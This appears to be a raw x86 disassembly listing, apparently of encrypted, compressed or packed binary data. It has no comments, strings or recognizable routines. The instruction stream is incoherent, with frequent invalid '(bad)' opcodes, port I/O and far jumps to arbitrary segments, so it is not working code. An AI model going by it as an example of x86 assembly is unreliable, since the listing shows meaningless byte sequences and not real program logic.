  41d033:	jne    0x41d028
  41d035:	xor    al,0x44
  41d037:	ror    DWORD PTR [eax+0x10],cl
  41d03a:	jle    0x41d09e
  41d03c:	push   0xffffffab
  41d03e:	push   ecx
  41d03f:	cmc    
  41d040:	int3   
  41d041:	mov    eax,0xae90ce42
  41d046:	mov    al,0x45
  41d048:	jmp    DWORD PTR [esi-0xe]
  41d04b:	mov    esi,0x142bdf06
  41d050:	xchg   ebp,eax
  41d051:	xor    BYTE PTR [ebx-0xa],ah
  41d054:	scas   al,BYTE PTR es:[edi]
  41d055:	test   DWORD PTR [ebx],esp
  41d057:	ret    0xab42
  41d05a:	xchg   ebx,eax
  41d05b:	jbe    0x41d066
  41d05d:	inc    ecx
  41d05e:	jmp    0x41d078
  41d060:	xchg   ecx,eax
  41d061:	std    
  41d062:	int3   
  41d063:	pushf  
  41d064:	cmc    
  41d065:	add    eax,0xeecc2e
  41d06a:	push   es
  41d06b:	ins    BYTE PTR es:[edi],dx
  41d06c:	inc    edx
  41d06d:	fbstp  TBYTE PTR [esi+edx*4-0x66]
  41d071:	std    
  41d072:	mov    ebp,eax
  41d074:	xchg   edx,eax
  41d075:	daa    
  41d076:	cmp    al,BYTE PTR [edx+0x43]
  41d079:	jae    0x41d083
  41d07b:	test   ch,dh
  41d07d:	sbb    DWORD PTR [esi+0x14],0xffffffff
  41d081:	scas   al,BYTE PTR es:[edi]
  41d082:	out    dx,eax
  41d083:	mov    al,bh
  41d085:	callw  0xe2ba
  41d089:	cwde   
  41d08a:	loop   0x41d0ce
  41d08c:	in     al,0xb5
  41d08e:	das    
  41d08f:	aad    0x70
  41d091:	and    esi,DWORD PTR [ecx]
  41d093:	and    BYTE PTR ds:0xf575dd48,dh
  41d099:	pop    edx
  41d09a:	jbe    0x41d117
  41d09c:	cmp    BYTE PTR [ebp-0xfeac8d9],cl
  41d0a2:	mov    bl,0x9b
  41d0a4:	add    al,BYTE PTR [eax+ecx*1+0x3d]
  41d0a8:	inc    esi
  41d0a9:	mov    edx,0x639c6e0d
  41d0ae:	repnz push eax
  41d0b0:	les    esi,FWORD PTR [edi-0x74]
  41d0b3:	ins    DWORD PTR es:[edi],dx
  41d0b4:	fst    DWORD PTR [ecx+ebp*4]
  41d0b7:	aaa    
  41d0b8:	inc    eax
  41d0b9:	push   ebx
  41d0ba:	xor    al,0xab
  41d0bc:	repz adc al,BYTE PTR [esi+ecx*1-0x50]
  41d0c1:	out    0xdb,eax
  41d0c3:	shl    ebp,cl
  41d0c5:	(bad)  
  41d0c7:	out    0x51,al
  41d0c9:	mov    bl,BYTE PTR [esi+0x2d678295]
  41d0cf:	add    eax,0x99feee8c
  41d0d4:	push   0x2c
  41d0d6:	pop    ecx
  41d0d7:	stc    
  41d0d8:	adc    eax,0xda6536c
  41d0dd:	cmp    eax,0x1849b6bf
  41d0e2:	xchg   BYTE PTR [edi-0x44],ah
  41d0e5:	mov    esi,DWORD PTR [edi+0x43]
  41d0e8:	sbb    DWORD PTR [edx+edx*4+0x3],esp
  41d0ec:	dec    DWORD PTR [ebx-0x7026bebd]
  41d0f2:	aas    
  41d0f3:	dec    eax
  41d0f4:	imul   eax,edi,0x3c
  41d0f7:	imul   ebx,esi,0xae6eae31
  41d0fd:	jle    0x41d086
  41d0ff:	ss (bad) 
  41d101:	lods   al,BYTE PTR ds:[esi]
  41d102:	aaa    
  41d103:	dec    ecx
  41d104:	rol    dl,0x54
  41d107:	and    DWORD PTR [ebx+eax*1],0x51354516
  41d10e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d10f:	sub    ecx,ebx
  41d111:	outs   dx,DWORD PTR ds:[esi]
  41d112:	mov    eax,0xddae2518
  41d117:	lods   al,BYTE PTR ds:[esi]
  41d118:	push   es
  41d119:	call   0x89e9:0x6b1be639
  41d120:	fdiv   QWORD PTR [edx+ebx*8]
  41d123:	adc    DWORD PTR [ebp-0x4f],ebp
  41d126:	add    ecx,DWORD PTR [ecx]
  41d128:	sub    eax,0xa820c623
  41d12d:	adc    DWORD PTR [eax-0x20],edx
  41d130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d131:	hlt    
  41d132:	cwde   
  41d133:	mov    ds:0x71,al
	...
  41d194:	add    BYTE PTR [eax],al
  41d196:	push   eax
  41d197:	ret    
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d15f
  41d1a3:	test   DWORD PTR [ebx],eax
  41d1a5:	scas   al,BYTE PTR es:[edi]
  41d1a6:	fwait
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ebx-0x22],ch
  41d1b0:	pop    esi
  41d1b1:	push   ebp
  41d1b2:	lods   al,BYTE PTR ds:[esi]
  41d1b3:	popa   
  41d1b4:	jno    0x41d177
  41d1b6:	jae    0x41d226
  41d1b8:	xchg   edx,eax
  41d1b9:	jle    0x41d1c3
  41d1bb:	push   esp
  41d1bc:	pop    esp
  41d1bd:	add    al,0x2d
  41d1bf:	xor    al,0xb9
  41d1c1:	cmovbe ebx,edx
  41d1c4:	in     eax,dx
  41d1c5:	sub    BYTE PTR [edi+eiz*4],dl
  41d1c8:	out    dx,eax
  41d1c9:	add    ch,BYTE PTR [edi+0x5063cd19]
  41d1cf:	test   eax,0xd1801588
  41d1d4:	and    DWORD PTR [ebx+ebp*1-0x33],eax
  41d1d8:	(bad)  
  41d1d9:	sub    BYTE PTR fs:[ebp+0x75],al
  41d1dd:	fdiv   st(7),st
  41d1df:	in     al,0x2e
  41d1e1:	mov    al,0xb2
  41d1e3:	push   ecx
  41d1e4:	popf   
  41d1e5:	sub    al,0x23
  41d1e7:	imul   edi,ebx,0xb8a9ba5e
  41d1ed:	lock xor eax,0x8ed778b9
  41d1f3:	mov    ebx,0x2730fe2a
  41d1f8:	ds sbb al,0x12
  41d1fb:	pop    ds
  41d1fc:	mov    edi,0x4513694
  41d201:	scas   al,BYTE PTR es:[edi]
  41d202:	fist   DWORD PTR [ecx]
  41d204:	mov    edx,0xf5e9d084
  41d209:	xchg   esi,eax
  41d20a:	add    eax,0xde4148c6
  41d20f:	sbb    DWORD PTR [edi-0x60],0xffffffc9
  41d213:	jl     0x41d1cd
  41d215:	and    DWORD PTR [edi-0x28],0xffffff92
  41d219:	ins    DWORD PTR es:[edi],dx
  41d21a:	push   esp
  41d21b:	dec    esi
  41d21c:	cs mov eax,0xc279bff2
  41d222:	cmp    al,0xa8
  41d224:	je     0x41d282
  41d226:	add    ebp,ecx
  41d228:	mov    al,0xdc
  41d22a:	loop   0x41d227
  41d22c:	sti    
  41d22d:	fdivr  st,st(3)
  41d22f:	repz (bad) 
  41d231:	aas    
  41d232:	mov    BYTE PTR [eax-0x5dff16f6],al
  41d238:	call   0x248b19e9
  41d23d:	or     al,0xa0
  41d23f:	arpl   WORD PTR [edi-0x29],dx
  41d242:	inc    ecx
  41d243:	addr16 push 0x3c580227
  41d249:	jle    0x41d1ee
  41d24b:	mov    eax,DWORD PTR [ebx-0x709b2e8d]
  41d251:	ret    0xf56b
  41d254:	fwait
  41d255:	pop    eax
  41d256:	loope  0x41d201
  41d258:	and    BYTE PTR [ebx-0x434da219],ah
  41d25e:	cli    
  41d25f:	mov    edi,0x98841e8e
  41d264:	mov    dl,BYTE PTR [esi+0x402366ec]
  41d26a:	mov    dh,BYTE PTR [ebp+0x62]
  41d26d:	scas   eax,DWORD PTR es:[edi]
  41d26e:	add    BYTE PTR [eax+0x31],0x9e
  41d272:	mov    dh,0x1f
  41d274:	push   ss
  41d275:	sti    
  41d276:	lea    esi,[eax+0x69]
  41d279:	call   0x7528:0xcf46796a
  41d280:	xor    al,0xf1
  41d282:	(bad)  
  41d283:	mov    ch,0x73
  41d285:	je     0x41d2bb
  41d287:	data16 std 
  41d289:	hlt    
  41d28a:	fsubr  DWORD PTR [esi]
  41d28c:	in     al,0xd0
  41d28e:	jae    0x41d2ea
  41d290:	jle    0x41d2da
  41d292:	mov    esi,0xda6a98bc
  41d297:	in     al,dx
  41d298:	mov    al,0xfe
  41d29a:	jbe    0x41d267
  41d29c:	in     al,dx
  41d29d:	xor    bl,BYTE PTR [esi-0x32]
  41d2a0:	mov    ah,0x40
  41d2a2:	stos   BYTE PTR es:[edi],al
  41d2a3:	cmp    esi,DWORD PTR [ebp-0x555d442a]
  41d2a9:	test   BYTE PTR [eax+eax*1],0x5a
  41d2ad:	bound  edi,QWORD PTR [ebx]
  41d2af:	hlt    
  41d2b0:	cld    
  41d2b1:	mov    ds:0x7f8cd,al
	...
  41d316:	inc    BYTE PTR [eax+0x7dff54f9]
  41d31c:	jmp    FWORD PTR [edx-0x7a8154e8]
  41d322:	test   DWORD PTR [ebp-0x75],eax
  41d325:	lahf   
  41d326:	mov    ds:0x7000134,al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [eax+0x13],cl
  41d330:	push   esp
  41d331:	xor    eax,0x98a0144
  41d336:	xor    eax,0x68044147
  41d33b:	fisttp QWORD PTR [ecx-0x9]
  41d33e:	xor    cl,BYTE PTR [ebx+0x7f]
  41d341:	or     BYTE PTR [edi+ebx*8-0x2fc0dd1],ch
  41d348:	enter  0xb46f,0x8f
  41d34c:	and    eax,DWORD PTR [ebx+eax*4-0x76ffa214]
  41d353:	jbe    0x41d378
  41d355:	sub    DWORD PTR [ecx],eax
  41d357:	test   DWORD PTR [eax],0x79c85be9
  41d35d:	lea    esp,[eax]
  41d35f:	int3   
  41d360:	pushf  
  41d361:	push   ebp
  41d362:	push   ss
  41d363:	pop    edi
  41d364:	(bad)  
  41d366:	push   edi
  41d367:	jge    0x41d3a0
  41d369:	int    0x7f
  41d36b:	inc    edi
  41d36c:	cwde   
  41d36d:	imul   ecx,edi,0x6f
  41d370:	je     0x41d365
  41d372:	xchg   BYTE PTR [eax-0x602d2db],cl
  41d378:	cwde   
  41d379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d37a:	popa   
  41d37b:	dec    edx
  41d37c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d37d:	and    ebp,ebx
  41d37f:	pop    ecx
  41d380:	enter  0xea77,0x69
  41d384:	gs sahf 
  41d386:	fisttp QWORD PTR [ebx]
  41d388:	cwde   
  41d389:	leave  
  41d38a:	(bad)  
  41d38b:	in     al,0xef
  41d38d:	in     al,dx
  41d38e:	xchg   BYTE PTR [ebp-0x44],dh
  41d391:	push   esp
  41d392:	enter  0x149,0x71
  41d396:	inc    ecx
  41d397:	push   cs
  41d398:	adc    ecx,DWORD PTR [esp+eax*1]
  41d39b:	aas    
  41d39c:	sbb    DWORD PTR [esi-0x4e],esp
  41d39f:	ret    
  41d3a0:	inc    edi
  41d3a1:	popfw  
  41d3a3:	xor    DWORD PTR [ebx],0x57
  41d3a6:	loopne 0x41d3bf
  41d3a8:	mov    ds:0x2642055a,eax
  41d3ad:	es push esp
  41d3af:	repz sahf 
  41d3b1:	jmp    0x41d3ce
  41d3b3:	mov    esi,0x298e32f0
  41d3b8:	jbe    0x41d430
  41d3ba:	jbe    0x41d369
  41d3bc:	add    dl,BYTE PTR [eax-0x5e5c69df]
  41d3c2:	adc    DWORD PTR [ebx+ecx*1-0x65],ebx
  41d3c6:	retf   0xdf39
  41d3c9:	fist   DWORD PTR [edx-0x52fb11f8]
  41d3cf:	and    eax,0x27f66075
  41d3d4:	dec    edx
  41d3d5:	cmp    DWORD PTR [eax+0x41],0x36
  41d3d9:	in     eax,dx
  41d3da:	rcl    BYTE PTR [eax-0x47],cl
  41d3dd:	xor    BYTE PTR [edx+0x2c178800],bl
  41d3e3:	add    eax,0xb9bfd6b6
  41d3e8:	mov    bl,0x6f
  41d3ea:	jge    0x41d3cc
  41d3ec:	ins    BYTE PTR es:[edi],dx
  41d3ed:	adc    ch,dl
  41d3ef:	pop    ebx
  41d3f0:	fwait
  41d3f1:	shr    BYTE PTR [edx+0x50703430],1
  41d3f7:	jb     0x41d40e
  41d3f9:	add    ecx,DWORD PTR [edx+0x66]
  41d3fc:	jb     0x41d41b
  41d3fe:	test   BYTE PTR [ebx-0x17],bl
  41d401:	adc    eax,0x88df4ed4
  41d406:	xor    edx,esp
  41d408:	in     al,0x9b
  41d40a:	jo     0x41d417
  41d40c:	mov    dl,0x79
  41d40e:	mov    cl,bh
  41d410:	retf   0xf14
  41d413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d414:	and    esi,eax
  41d416:	or     dh,BYTE PTR [ecx-0x39]
  41d419:	clc    
  41d41a:	test   eax,0xb9986d07
  41d41f:	loop   0x41d419
  41d421:	jecxz  0x41d455
  41d423:	xchg   esi,eax
  41d424:	add    DWORD PTR [ecx-0xaec0f44],0xcd8b71b1
  41d42e:	or     BYTE PTR [ebx-0x854eeb5],ah
  41d434:	fld    QWORD PTR [eax]
	...
  41d496:	div    BYTE PTR [esi]
  41d498:	rcl    BYTE PTR [edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	adc    DWORD PTR [edx+0x58],0xffffffa6
  41d4a6:	test   eax,0x7000135
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    cl,cl
  41d4af:	(bad)  
  41d4b0:	sub    ebx,esp
  41d4b2:	lods   eax,DWORD PTR ds:[esi]
  41d4b3:	xor    BYTE PTR [esi],ch
  41d4b5:	sbb    BYTE PTR [esi+0x71735ca1],0xe4
  41d4bc:	scas   al,BYTE PTR es:[edi]
  41d4bd:	test   eax,0xf8b6d82f
  41d4c2:	push   es
  41d4c3:	adc    al,0x64
  41d4c5:	(bad)  
  41d4c6:	idiv   ecx
  41d4c8:	std    
  41d4c9:	iret   
  41d4ca:	loop   0x41d455
  41d4cc:	in     al,0xf0
  41d4ce:	test   al,0xd4
  41d4d0:	cmp    eax,0x2a167fa4
  41d4d5:	test   eax,0xf2ee0839
  41d4da:	sbb    ch,0x30
  41d4dd:	sbb    DWORD PTR [edx+0x579218f2],edi
  41d4e3:	dec    esi
  41d4e4:	mov    eax,DWORD PTR [eax+0x42d61e23]
  41d4ea:	inc    ebx
  41d4eb:	mov    al,ds:0xd0ac890a
  41d4f0:	xchg   DWORD PTR [eax],edx
  41d4f2:	mov    bh,BYTE PTR [esi+0x485a33a1]
  41d4f8:	stos   BYTE PTR es:[edi],al
  41d4f9:	bound  edx,QWORD PTR [eax+0x5f75c041]
  41d4ff:	fldcw  WORD PTR [ebp-0x16]
  41d502:	(bad)  
  41d503:	push   ds
  41d504:	mov    edi,0xd8658af7
  41d509:	fwait
  41d50a:	sub    DWORD PTR [edx-0x3b],ebx
  41d50d:	das    
  41d50e:	imul   eax,DWORD PTR [edx],0x8844f26
  41d514:	mov    ah,0xbe
  41d516:	sbb    al,0x56
  41d518:	xor    esi,ecx
  41d51a:	std    
  41d51b:	add    bl,BYTE PTR [esi+0x4adbe524]
  41d521:	push   eax
  41d522:	inc    ecx
  41d523:	pop    ebx
  41d524:	mov    WORD PTR [edx],fs
  41d526:	and    dl,BYTE PTR [edx+0x55afec4e]
  41d52c:	outs   dx,DWORD PTR ds:[esi]
  41d52d:	mov    esp,0x3a8c9295
  41d532:	iret   
  41d533:	jmp    0x9517:0xc9582ea6
  41d53a:	or     al,0xd2
  41d53c:	stc    
  41d53d:	pushf  
  41d53e:	mov    esp,0x44d21aca
  41d543:	pop    eax
  41d544:	or     DWORD PTR [edx],ebp
  41d546:	aaa    
  41d547:	enter  0x5344,0x7e
  41d54b:	test   al,0x16
  41d54d:	dec    esi
  41d54e:	ss xchg esp,eax
  41d550:	sub    ebx,DWORD PTR [eax+0x64]
  41d553:	pop    ebx
  41d554:	or     dl,BYTE PTR ds:0x7c89b7ab
  41d55a:	sub    ecx,DWORD PTR [ecx-0x5fa7424d]
  41d560:	jp     0x41d591
  41d562:	inc    ebx
  41d563:	rcr    ecx,1
  41d565:	and    DWORD PTR [ebx+0x599a0d0d],0xffffffb8
  41d56c:	push   ecx
  41d56d:	and    DWORD PTR [edx+0x6b],0xbc2a386c
  41d574:	sub    cl,0xf9
  41d577:	pop    edx
  41d578:	xor    BYTE PTR [edx+edi*8],0xbf
  41d57c:	add    eax,0xd85a82ba
  41d581:	inc    edx
  41d582:	outs   dx,DWORD PTR ds:[esi]
  41d583:	clc    
  41d584:	add    eax,0x4037b959
  41d589:	mov    bl,0xbb
  41d58b:	call   0xa2e46fe4
  41d590:	push   0xffffffa4
  41d592:	dec    esp
  41d593:	loop   0x41d58f
  41d595:	mov    dh,0x6f
  41d597:	outs   dx,DWORD PTR ds:[esi]
  41d598:	stos   BYTE PTR es:[di],al
  41d59a:	dec    esp
  41d59b:	jno    0x41d59d
  41d59d:	mov    ch,0xd1
  41d59f:	mov    ebp,0xd3cc62af
  41d5a4:	test   DWORD PTR [ecx],esp
  41d5a6:	pop    es
  41d5a7:	xlat   BYTE PTR ds:[ebx]
  41d5a8:	pshufw mm3,QWORD PTR [eax-0x1a5ddecc],0xf6
  41d5b0:	inc    eax
  41d5b1:	retf   
  41d5b2:	inc    esi
  41d5b3:	and    esp,DWORD PTR [eax+eax*1+0x0]
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x72bfd221]
  41d624:	adc    BYTE PTR [eax+esi*4+0x36],al
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [edx-0x63cb05fd],cl
  41d633:	cwde   
  41d634:	(bad)  
  41d635:	xlat   BYTE PTR ds:[ebx]
  41d636:	dec    ebp
  41d637:	fistp  QWORD PTR [ebx]
  41d639:	inc    ebp
  41d63a:	xchg   edx,eax
  41d63b:	xor    al,0x85
  41d63d:	shr    DWORD PTR [ebp-0x7573773e],0xdd
  41d644:	cdq    
  41d645:	inc    eax
  41d646:	push   ebx
  41d647:	xor    esi,DWORD PTR [eax+edi*8+0x274bab23]
  41d64e:	push   ebp
  41d64f:	jo     0x41d6a1
  41d651:	xor    eax,DWORD PTR [ebp+0x3b]
  41d654:	mov    al,0x48
  41d656:	je     0x41d60b
  41d658:	rcl    BYTE PTR [ecx+edx*4],1
  41d65b:	mov    BYTE PTR [ecx],bl
  41d65d:	xor    bh,0x18
  41d660:	inc    ebx
  41d661:	xor    eax,0x2eac6fa0
  41d667:	cmp    DWORD PTR [esi-0x69],0xfffffff1
  41d66b:	cmp    ebx,DWORD PTR [ecx]
  41d66d:	popa   
  41d66e:	lds    esp,FWORD PTR [esp+ebx*4]
  41d671:	and    DWORD PTR [edx],ebx
  41d673:	sub    al,0x47
  41d675:	push   ecx
  41d676:	xlat   BYTE PTR ds:[ebx]
  41d677:	arpl   WORD PTR [eax-0x49f7b0bd],ax
  41d67d:	ret    
  41d67e:	fmulp  st(4),st
  41d680:	adc    DWORD PTR [esi-0x28],ecx
  41d683:	jo     0x41d6a7
  41d685:	dec    eax
  41d686:	inc    edi
  41d687:	xor    eax,0xc1a388e7
  41d68c:	xchg   edx,eax
  41d68d:	sbb    al,0x79
  41d68f:	pop    edx
  41d690:	das    
  41d691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d692:	ins    DWORD PTR es:[edi],dx
  41d693:	daa    
  41d694:	test   al,0x66
  41d696:	jae    0x41d6f9
  41d698:	pop    ecx
  41d699:	loop   0x41d705
  41d69b:	sub    eax,0x48bd7080
  41d6a0:	lods   al,BYTE PTR ds:[esi]
  41d6a1:	pop    esi
  41d6a2:	sub    eax,0x5068156f
  41d6a7:	imul   edx,DWORD PTR ds:0x1c4d66e3,0xffffffc8
  41d6ae:	sub    esp,esp
  41d6b0:	add    DWORD PTR [edi],0xffffffb0
  41d6b3:	hlt    
  41d6b4:	sbb    dl,cl
  41d6b6:	adc    al,0xf3
  41d6b8:	pop    ecx
  41d6b9:	shl    DWORD PTR [ebx+0x16],cl
  41d6bc:	mov    dl,0x6a
  41d6be:	pop    edx
  41d6bf:	lods   al,BYTE PTR ds:[esi]
  41d6c0:	mov    dh,0xfe
  41d6c2:	lds    edx,FWORD PTR [esi]
  41d6c4:	outs   dx,BYTE PTR ds:[esi]
  41d6c5:	add    BYTE PTR [edx+edx*2],dh
  41d6c8:	ins    BYTE PTR es:[edi],dx
  41d6c9:	mov    edx,0xf306a411
  41d6ce:	jmp    0xea753a4
  41d6d3:	fstp   TBYTE PTR [ebp+eax*4-0x27]
  41d6d7:	pop    esp
  41d6d8:	jae    0x41d65e
  41d6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6db:	push   DWORD PTR [edi]
  41d6dd:	clc    
  41d6de:	mov    ebp,0x40c09df9
  41d6e3:	div    BYTE PTR [esi-0x70]
  41d6e6:	pop    esi
  41d6e7:	cdq    
  41d6e8:	pop    esp
  41d6e9:	mov    eax,ds:0xf07786b5
  41d6ee:	mov    dl,0xca
  41d6f0:	in     al,dx
  41d6f1:	enter  0xb82b,0xb0
  41d6f5:	repnz xor DWORD PTR [edi+edx*1+0x67],esp
  41d6fa:	xor    DWORD PTR [esi],esi
  41d6fc:	and    al,0x40
  41d6fe:	daa    
  41d6ff:	pop    esi
  41d700:	or     al,0xf5
  41d702:	out    0xb7,al
  41d704:	call   0xce6a:0x5d272caa
  41d70b:	or     BYTE PTR [edi-0x1de527b7],ch
  41d711:	jp     0x41d70a
  41d713:	and    esi,esi
  41d715:	(bad)  
  41d716:	popa   
  41d717:	shl    BYTE PTR [eax*8+0x13575242],0x41
  41d71f:	mov    bl,0xad
  41d721:	xor    dh,BYTE PTR ds:0xbd946fed
  41d727:	cmp    cl,dl
  41d729:	push   es
  41d72a:	sub    esi,DWORD PTR [edi+0x3b]
  41d72d:	sar    DWORD PTR [ebp+0x4b],cl
  41d730:	cmp    al,ah
  41d732:	sbb    BYTE PTR [di+0x0],cl
	...
  41d796:	and    al,0xce
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	sar    DWORD PTR [ebx-0x2a],1
  41d7a5:	and    al,0xb7
  41d7a7:	aaa    
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    ah,al
  41d7af:	ja     0x41d7f6
  41d7b1:	sbb    BYTE PTR [edx],ch
  41d7b3:	and    eax,0x72a6ced7
  41d7b8:	push   ss
  41d7b9:	push   esi
  41d7ba:	fstp   QWORD PTR [ebp+esi*1+0x4e]
  41d7be:	jg     0x41d80a
  41d7c0:	rcr    DWORD PTR [edx-0x48],1
  41d7c3:	cmp    DWORD PTR [edx+edx*8],ebp
  41d7c6:	data16 jns 0x41d811
  41d7c9:	scas   eax,DWORD PTR es:[edi]
  41d7ca:	inc    edi
  41d7cb:	sar    DWORD PTR [ebp+0x4a],0xcb
  41d7cf:	xchg   DWORD PTR fs:[edx-0x3c],eax
  41d7d3:	sub    dh,ch
  41d7d5:	pop    esp
  41d7d6:	sahf   
  41d7d7:	push   ebx
  41d7d8:	jp     0x41d7d1
  41d7da:	jb     0x41d779
  41d7dc:	inc    ecx
  41d7dd:	(bad)  
  41d7de:	lds    esp,FWORD PTR [esi]
  41d7e0:	retf   0xae4d
  41d7e3:	(bad)  
  41d7e4:	xchg   WORD PTR [edx+0x623eba1b],dx
  41d7eb:	clc    
  41d7ec:	xor    ebp,DWORD PTR [ebx-0x3f12e6c4]
  41d7f2:	dec    ebx
  41d7f3:	(bad)  
  41d7f4:	cs or  DWORD PTR gs:[edi],0xffffff87
  41d7f9:	mov    dl,0x66
  41d7fb:	sahf   
  41d7fc:	out    dx,eax
  41d7fd:	adc    al,0x4a
  41d7ff:	call   0x88f4cb45
  41d804:	dec    ebx
  41d805:	enter  0x8795,0x69
  41d809:	jb     0x41d81a
  41d80b:	dec    ebp
  41d80c:	sub    BYTE PTR [eax+eax*8+0x17],cl
  41d810:	cs inc ebx
  41d812:	out    dx,al
  41d813:	cs mov esp,0x3d8535f7
  41d819:	mov    cl,0x1e
  41d81b:	sti    
  41d81c:	jp     0x41d7a4
  41d81e:	mov    ds:0xd9b4dbf7,al
  41d823:	pop    esi
  41d824:	sub    esi,DWORD PTR [esi-0x65]
  41d827:	sub    BYTE PTR [ebx+0x48],cl
  41d82a:	add    BYTE PTR [ebx],0x5b
  41d82d:	mov    ds:0x4ac53abb,al
  41d832:	pop    eax
  41d833:	jp     0x41d7e6
  41d835:	pop    esp
  41d836:	xchg   BYTE PTR ds:0x506731e1,ch
  41d83c:	fdivrp st(7),st
  41d83e:	sub    eax,0xa19801bf
  41d843:	test   BYTE PTR [esi+0x66],cl
  41d846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d847:	mov    edx,0xfbf2b308
  41d84c:	dec    ecx
  41d84d:	mov    esp,0xb7c55f43
  41d852:	pop    ebp
  41d853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d854:	mov    dl,0x64
  41d856:	out    dx,eax
  41d857:	fcmovbe st,st(4)
  41d859:	add    eax,0xfb8d765f
  41d85e:	pop    esp
  41d85f:	add    al,0x3
  41d861:	lock add BYTE PTR [edi-0x6f675ab9],0x67
  41d869:	outs   dx,WORD PTR ds:[esi]
  41d86b:	push   ss
  41d86c:	jns    0x41d883
  41d86e:	sub    eax,0x3c1a2c0e
  41d873:	daa    
  41d874:	xor    al,0xf4
  41d876:	dec    edx
  41d877:	push   ecx
  41d878:	fst    QWORD PTR [edi+0x15df211f]
  41d87e:	mov    edi,0xc61844de
  41d883:	mov    ch,0x6d
  41d885:	xchg   edi,eax
  41d886:	test   DWORD PTR ds:0xba2c71ff,esp
  41d88c:	int3   
  41d88d:	call   0xf84a:0x8018166b
  41d894:	hlt    
  41d895:	or     esi,esi
  41d897:	mov    esp,?
  41d899:	das    
  41d89a:	mov    edx,0x8bf3b174
  41d89f:	sbb    eax,0x557cd9e2
  41d8a4:	jbe    0x41d8c1
  41d8a6:	xor    al,0x8b
  41d8a8:	mov    WORD PTR [eax+edx*2+0x6493c790],?
  41d8af:	rol    BYTE PTR [eax],cl
  41d8b1:	jecxz  0x41d915
  41d8b3:	pop    ebp
  41d8b4:	push   ebx
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0xf5e3dab
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [ebx+0x5],ah
  41d930:	jb     0x41d96b
  41d932:	mov    esp,0x80df7093
  41d937:	(bad)  
  41d938:	jmp    0x4823:0xad41d7ed
  41d93f:	dec    edx
  41d940:	test   DWORD PTR [esi],edi
  41d942:	dec    eax
  41d943:	sar    DWORD PTR [ebx-0x73],1
  41d946:	cmp    ebx,ecx
  41d948:	push   edx
  41d949:	inc    edx
  41d94a:	std    
  41d94b:	mov    ds:0x81b8628d,eax
  41d950:	dec    esi
  41d951:	jo     0x41d9a9
  41d953:	psllw  mm7,QWORD PTR [edi+edx*4-0x10cb9b8c]
  41d95b:	loopne 0x41d9b6
  41d95d:	ret    0x7af9
  41d960:	jmp    0x44b04137
  41d965:	inc    ebp
  41d966:	int3   
  41d967:	aas    
  41d968:	loope  0x41d945
  41d96a:	adc    bl,cl
  41d96c:	ja     0x41d937
  41d96e:	push   esp
  41d96f:	adc    al,0x6e
  41d971:	jl     0x41d9c8
  41d973:	sub    al,0xb4
  41d975:	mov    al,0x3e
  41d977:	dec    ebx
  41d978:	push   ecx
  41d979:	fidivr DWORD PTR [edx+0x15]
  41d97c:	cmp    ebp,eax
  41d97e:	mov    ch,ch
  41d980:	jmp    0x41d954
  41d982:	pusha  
  41d983:	mov    bh,BYTE PTR [edi+0x62]
  41d986:	push   esp
  41d987:	(bad)  
  41d989:	or     cl,BYTE PTR [eax-0x36e98543]
  41d98f:	push   ds
  41d990:	cdq    
  41d991:	(bad)
  41d994:	fnsave [eax]
  41d996:	popf   
  41d997:	adc    eax,0x3bedb3b2
  41d99c:	ins    DWORD PTR es:[edi],dx
  41d99d:	cld    
  41d99e:	fstp   TBYTE PTR [esi+0x5e]
  41d9a1:	rcr    DWORD PTR [edi-0x5d68fe3c],cl
  41d9a7:	daa    
  41d9a8:	sahf   
  41d9a9:	call   0x28947247
  41d9ae:	jle    0x41da0c
  41d9b0:	mov    ch,0xb8
  41d9b2:	push   0xffffff9f
  41d9b4:	ds push ds
  41d9b6:	(bad)  
  41d9b7:	push   cs
  41d9b8:	in     al,dx
  41d9b9:	out    dx,eax
  41d9ba:	test   ch,0x4b
  41d9bd:	cld    
  41d9be:	div    BYTE PTR [ecx-0x17efc94f]
  41d9c4:	sbb    DWORD PTR [eax],0x72
  41d9c7:	sbb    eax,0xb9ab1cbe
  41d9cc:	sub    al,0x89
  41d9ce:	jl     0x41d97e
  41d9d0:	imul   eax,DWORD PTR [ecx-0x2f],0xe1cab20f
  41d9d7:	add    al,0xa8
  41d9d9:	sti    
  41d9da:	dec    ebx
  41d9db:	std    
  41d9dc:	pop    edi
  41d9dd:	add    ebx,edx
